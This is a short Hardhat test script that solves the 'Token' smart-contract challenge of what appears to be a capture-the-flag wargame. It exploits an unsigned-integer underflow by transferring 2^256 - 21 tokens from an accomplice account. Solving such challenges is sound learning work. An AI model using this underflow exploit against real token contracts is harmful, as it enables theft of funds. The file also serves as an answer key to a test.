import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, accomplice] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Token`);
  const challengeAddress = await createChallenge(
    `0x63bE8347A617476CA461649897238A31835a32CE`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const eoaAddress = await eoa.getAddress();
  // contract uses unsigned integer which is always >= 0, overflow check is useless
  tx = await challenge
    .connect(accomplice)
    // we start with 20 tokens, make sure eoa's balance doesn't overflow as well
    .transfer(eoaAddress, BigNumber.from(`2`).pow(256).sub(`21`));
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
